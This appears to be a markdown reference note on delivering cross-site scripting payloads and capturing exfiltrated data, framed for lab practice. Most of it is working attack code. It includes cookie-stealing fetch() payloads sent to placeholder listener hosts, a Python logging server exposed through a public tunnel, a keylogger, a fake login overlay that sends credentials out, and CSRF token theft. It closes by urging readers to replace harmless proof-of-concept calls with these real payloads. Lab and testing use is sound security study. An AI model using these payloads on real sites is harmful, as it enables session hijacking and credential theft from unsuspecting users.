# XSS Payload Delivery Techniques

Reference notes on how an attacker delivers an XSS payload to a victim, and how to receive the resulting data back, for use in controlled lab/practice environments.

## 1. Core Idea

There are two separate problems in XSS exploitation:

1. **Triggering** the payload (does it fire on page load, or does it need extra action?)
2. **Receiving** the result (if the payload exfiltrates data, where does that data go, and how do you capture it?)

These are independent. A payload can need "no page" to trigger but still need a listening server to receive data.

## 2. Delivery Method by Trigger Type

### Type 1 — Direct link only (no HTML page needed)

Used when the payload fires automatically as soon as the vulnerable page loads — no extra attacker-controlled logic is required.

Common auto-firing events:
- `onerror` (broken `<img>`, broken resource)
- `onload` (`<body>`, `<svg>`)
- `autofocus` + `onfocus` (input field)
- `ontoggle` (`<details>` tag)
- `onmouseover` (less reliable — depends on victim hovering)

Example — malicious link sent directly to victim (email, chat, SMS):

```
https://victim-site.com/search?q=<img src=x onerror="fetch('https://LISTENER-URL/steal?c='+document.cookie)">
```

No attacker-hosted page is needed here. The victim's browser does everything once the link is clicked.

### Type 2 — Needs an attacker-hosted HTML page

Used when the payload's trigger condition can't fire by itself and needs extra script logic running alongside it. Common cases:

- `onresize` — doesn't fire on its own; needs an `<iframe>` that forces a resize via `onload`
- `onscroll` — needs a script to programmatically scroll the page
- Auto-submitting forms — for CSRF-style XSS requiring a POST instead of GET
- Multi-step chains (redirect + payload, clickjacking combos)
- DOM XSS relying on `postMessage` — attacker page sends the message

Example — forcing an `onresize` payload:

```html
<iframe src="https://victim-site.com/search?q=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.width='100px'"></iframe>
```

## 3. Receiving Data Back (Exfiltration)

When a payload sends data out (cookies, tokens, page content), you need something listening to capture it. The link/page only sends the request — it does not "return" anything to you directly. You must log it server-side.

### Option A — Self-hosted listener

1. Minimal logging server (`log_server.py`):

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Got data: {self.path}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
```

2. Run it:

```
python3 log_server.py
```

3. Expose it publicly with a tunnel:

```
cloudflared tunnel --url http://localhost:8000
```

4. Use the generated public URL inside the payload:

```html
<img src=x onerror="fetch('https://your-tunnel-url.trycloudflare.com/steal?c='+document.cookie)">
```

5. Victim triggers it → request lands in your terminal.

### Option B — Caido OAST

Caido has a built-in OAST (Out-of-Band Application Security Testing) module, similar in purpose to Burp Collaborator. It gives you a ready-made listener domain without running your own server or tunnel.

Workflow:
1. Open the OAST panel in Caido and generate a unique payload domain.
2. Insert that domain into your payload instead of a self-hosted URL:

```html
<img src=x onerror="fetch('https://YOUR-OAST-ID.oast-domain/steal?c='+document.cookie)">
```
3. Deliver the link/page to the victim as usual.
4. Check the OAST panel in Caido — interactions (DNS/HTTP hits) show up there automatically, including any data appended to the request.

This is generally the fastest option for practice since there's no local server or tunnel to maintain, and it works the same for blind XSS, SSRF, or any other out-of-band confirmation need.

### Option C — Third-party listener (quick practice only)

- `webhook.site` — generates an instant unique URL, shows incoming requests in a browser dashboard. No setup.
- Burp Collaborator — similar to Caido OAST, built into Burp Suite.

## 4. Proof-of-Concept vs Real-World Impact

Lab payloads like `alert()` or `print()` are **harmless proof-of-concept (PoC) calls**, not real attacks. They exist so that:

- The result is visible without needing any extra server/listener.
- An automated grading checker can detect the function call and confirm the vulnerability is exploitable.
- No legal/ethical issues arise from demonstrating impact in a shared lab environment.

They only prove that **arbitrary JavaScript execution is possible** at that injection point. A real attacker would replace the PoC call with an actual payload. The trigger mechanism (same bypass, same event, same delivery method) stays identical — only the function body changes.

Example — reusing the same `onresize` bypass technique, but with real payloads instead of `print()`:

**Session cookie theft:**
```html
<iframe src="https://victim-site.com/?search=%22%3E%3Cbody%20onresize=xss()%3E" onload="this.style.width='100px'">
<script>
function xss() {
  fetch('https://LISTENER-URL/steal?c=' + document.cookie);
}
</script>
```

**Keylogging:**
```javascript
function xss() {
  document.addEventListener('keypress', e => {
    fetch('https://LISTENER-URL/keys?k=' + e.key);
  });
}
```

**Phishing form injection (fake login overlay):**
```javascript
function xss() {
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">
      <h2>Session expired. Please log in again.</h2>
      <form onsubmit="fetch('https://LISTENER-URL/creds?u='+this.u.value+'&p='+this.p.value);return false;">
        <input name="u" placeholder="Username">
        <input name="p" type="password" placeholder="Password">
        <button>Log in</button>
      </form>
    </div>`;
}
```

**CSRF token theft (to later perform a sensitive action as the victim):**
```javascript
function xss() {
  const token = document.querySelector('input[name="csrf"]').value;
  fetch('https://LISTENER-URL/token?t=' + token);
}
```

The delivery method (Type 1 link vs Type 2 attacker-hosted page) and the receiving setup (self-hosted listener, Caido OAST, webhook.site) from the sections above apply the same way regardless of which payload body is used.

## 5. Summary Table

| Trigger needs a page? | Needs a listener? | Example |
|---|---|---|
| No (auto-fires) | No (no data sent) | `onerror=alert(1)` — just confirms XSS fires |
| No (auto-fires) | Yes (data exfil) | `onerror=fetch('https://listener/?c='+document.cookie)` |
| Yes (forced trigger) | No | `onresize` payload inside iframe, calls `print()` only |
| Yes (forced trigger) | Yes | `onresize` payload inside iframe, `fetch()`s cookie to listener |

## 6. Practical Notes

- A "page" is only needed when the trigger condition can't fire by itself.
- A "listener" is only needed when the payload sends data somewhere (as opposed to just proving execution with `alert()`/`print()`).
- For controlled lab practice: self-hosted server + tunnel works, but Caido's OAST (or Collaborator) removes the setup step and is usually faster to iterate with.
- After passing a lab with `alert()`/`print()`, replace the PoC call with a real payload (cookie theft, keylogger, etc.) in your own controlled environment (DVWA, Juice Shop, a personal test app) to see the full impact — never on a live/production target without authorization.
